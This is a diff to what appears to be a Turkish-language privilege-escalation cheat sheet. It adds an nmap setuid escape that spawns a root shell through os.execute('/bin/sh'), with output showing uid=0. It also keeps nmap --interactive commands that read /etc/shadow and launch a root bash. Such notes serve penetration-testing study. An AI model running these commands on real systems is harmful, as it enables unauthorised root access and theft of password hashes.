@@ -29,13 +29,24 @@ bkz -> http://www.dankalia.com/tutor/01005/0100501004.htm
 - vi - by entering :![commandname]
 - man - by entering![command name] replacing [command name] with the program you wish to run.
 ````
+````
+Nmap setuid privesc
+
+  nmap --script <(echo 'os.execute("/bin/sh")')
+  Starting Nmap 7.01 ( https://nmap.org ) at 2016-05-03 10:29 EEST
+  NSE: Warning: Loading '/dev/fd/63' -- the recommended file extension is '.nse'.
+  # root  > komut olarak 'whoami' girdim
+  # uid=0(root) gid=0(root) groups=0(root),141(lpadmin)  > komut olarak 'id' girdim
+
+  > buradaki sıkıntı, komut olarak yazılanların görünmemesidir. Fakat çıktı kesintisiz bir şekilde ekrana dökülmektedir.
+````
 
 ````
-nmap --interactive
-> !whoami              # root
-> !cat /etc/shadow     # SUCCESS: prints out hashed passwords
-> !bash                # SUCCESS: launches root shell
-bkz -> https://gist.github.com/dergachev/7916152
+  nmap --interactive
+  > !whoami              # root
+  > !cat /etc/shadow     # SUCCESS: prints out hashed passwords
+  > !bash                # SUCCESS: launches root shell
+  bkz -> https://gist.github.com/dergachev/7916152
 ````
 
 ````
